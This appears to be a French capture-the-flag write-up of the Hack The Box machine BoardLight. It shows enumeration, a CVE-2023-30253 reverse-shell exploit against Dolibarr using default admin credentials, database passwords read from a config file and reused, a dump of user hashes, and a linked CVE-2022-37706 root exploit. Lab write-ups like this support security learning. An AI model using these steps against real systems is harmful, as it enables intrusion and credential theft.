# Info de la box

```md
My IP: 10.10.14.3
IP Target: 10.10.11.11
OS: Linux

Creds:
	Email: info@board.htb
```
# Énumération

```Bash
➜ sudo nmap -sSVC -T5 -p- 10.10.11.11
PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)  
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)  
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)  
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))  
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).  
|_http-server-header: Apache/2.4.41 (Ubuntu)  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```bash
➜ sudo ffuf -w Seclists/Discovery/Web-Content/combined_directories.txt -u http://10.10.11.11/FUZZ -c -recursion
```

RAS

```bash
➜ sudo ffuf -w SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://FUZZ.10.10.11.11/ -c
```

RAS

```bash
➜ sudo ffuf -w SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://board.htb/ -H "Host:FUZZ.board.htb" -c

crm                     [Status: 200, Size: 6360, Words: 397]
```

```bash
➜ whatweb -a3 http://10.10.11.11/
http://10.10.11.11/ [200 OK] Apache[2.4.41], OWL Carousel [2.3.4], Bootstrap[4.3.1], Country[RESERVED][ZZ], Email[info@board.htb], HTML5,  
HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.11], JQuery[3.4.1], Script[text/javascript], X-UA-Co  
mpatible[IE=edge]
```

```bash
➜ wafw00f http://10.10.11.11/
[*] Checking http://10.10.11.11/  
[+] Generic Detection results:  
[-] No WAF detected by the generic detection  
[~] Number of requests: 7
```
# On commence à check la Page Web

#### board.htb

Rien
#### crm.board.htb
- user/pass admin:admin
- Mode authentification: dolibarr 17.0.0
- thème: eldy
- Onglet Sites Web permet la création d'une page web
	-> on peut tenter un reverse shell

Effectivement CVE [cve-2023-30253]
#### Exploit de la CVE:
```bash
➜ python3.9 CVE-2023-30253.py --url http://crm.board.htb/ -u admin -p admin -r 10.10.14.3 9001
```

On est alors connecté en tant que www-data sur la machine `www-data@boardlight`
On peut noter que dans /home il y a un groupe/user nommé larissa
# On étudie alors les connections/services

```bash
(remote) www-data@boardlight:/home$ ss -tl  
State          Recv-Q         Send-Q                 Local Address:Port                   Peer Address:Port        Process           
LISTEN         0              151                        127.0.0.1:mysql                       0.0.0.0:*                             
LISTEN         0              70                         127.0.0.1:33060                       0.0.0.0:*                             
LISTEN         0              128                          0.0.0.0:ssh                         0.0.0.0:*                             
LISTEN         0              4096                   127.0.0.53%lo:domain                      0.0.0.0:*                             
LISTEN         0              511                                *:http                              *:*
```

- On voit qu'il y a donc une SGBD MySQL qui tourne dérrière sur le port 3306
- On cherchera évidemment à s'y connecter mais il nous manque des creds

En attendant on retourne sur crm.board.htb et j'ai vu un paramètre intéressant

Je me suis demandé si on pouvait pas IDOR. Alors j'ai lancé un fuzz. Mais Rien

```bash
➜ sudo ffuf -w 5-digits-00000-99999.txt -u http://crm.board.htb/user/card.php\?id\=FUZZ -c -fs 6373

RAS
```

Je pense fortement qu'il faut fouiller ici `/var/www/html/crm.board.htb`
	-> Bingo on voit les creds ici !
	`/var/www/html/crm.board.htb/htdocs/conf/conf.php`

```bash
$dolibarr_main_url_root='http://crm.board.htb';  
$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';  
$dolibarr_main_url_root_alt='/custom';  
$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';  
$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';  
$dolibarr_main_db_host='localhost';  
$dolibarr_main_db_port='3306';  
$dolibarr_main_db_name='dolibarr';  
$dolibarr_main_db_prefix='llx_';  
$dolibarr_main_db_user='dolibarrowner';  
$dolibarr_main_db_pass='serverfun2$2023!!';  
$dolibarr_main_db_type='mysqli';  
$dolibarr_main_db_character_set='utf8';  
$dolibarr_main_db_collation='utf8_unicode_ci';  
// Authentication settings  
$dolibarr_main_authentication='dolibarr';
```

# On va tenter de se connecter à la SGBD MySQL

```bash
➜ mysql -h localhost -P 3306 -u "dolibarrowner" -p
# Et on est connecté ;)

mysql> SHOW DATABASES;  
+--------------------+  
| Database           |  
+--------------------+  
| dolibarr           |  
| information_schema |  
| performance_schema |  
+--------------------+

mysql> USE dolibarr;
	[...]
mysql> SHOW TABLES; # Voici les 3 qui ont retenues mon attention
- llx_user
- llx_usergroup
- llx_website

# Je dump alors la table.
mysql> SELECT * FROM llx_user\G;  
*************************** 1. row ***************************  
                      rowid: 1  
                     entity: 0  
               ref_employee:    
                    ref_ext: NULL  
                      admin: 1  
                   employee: 1  
           fk_establishment: 0  
                      datec: 2024-05-13 13:21:56  
                        tms: 2024-05-13 13:21:56  
                      login: dolibarr  
               pass_crypted: $2y$10$VevoimSke5Cd1/nX1Ql9Su6RstkTRe7UX1Or.cm8bZo56NjCMJzCm   
                   lastname: SuperAdmin  
*************************** 2. row ***************************  
                      rowid: 2  
                     entity: 1  
               ref_employee:    
                    ref_ext: NULL  
                      admin: 0  
                   employee: 1  
           fk_establishment: 0  
                      datec: 2024-05-13 13:24:01  
                        tms: 2024-05-15 09:58:40  
                      login: admin  
               pass_crypted: $2y$10$gIEKOl7VZnr5KLbBDzGbL.YuJxwz5Sdl5ji3SEuiUSlULgAhhjH96  
                    api_key: yr6V3pXd9QEI  
                   lastname: admin  

```

- On a dump la db mais le mdp de larissa c'était `serverfun2$2023!!`
-> (réutilisation de mdp)

# Privesc

J'ai donc cherché à élever les privilèges via des droits sudo et des crontabs.
Mais rien.

Alors je lance un petit linpeas.sh et je vais regarder les SUID:
###### Analyse des droits SUID
```bash
larissa@boardlight:/tmp$ cat recon-linpeas | grep "SUID"  
 Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs)    
╔══════════╣ SUID - Check easy privesc, exploits and write perms  
-rwsr-xr-x 1 root root 27K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys (Unknown SUID binary!)  
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd (Unknown SUID binary!)  
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight (Unknown SUID binary!)  
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset (Unknown SUID binary!)
```

On voit que `enlightenment` c'est assez étrange on regarde sur internet
	-> https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit
	-> On lance le script et hop on est root !

On vient de pwn la box Boardlight :D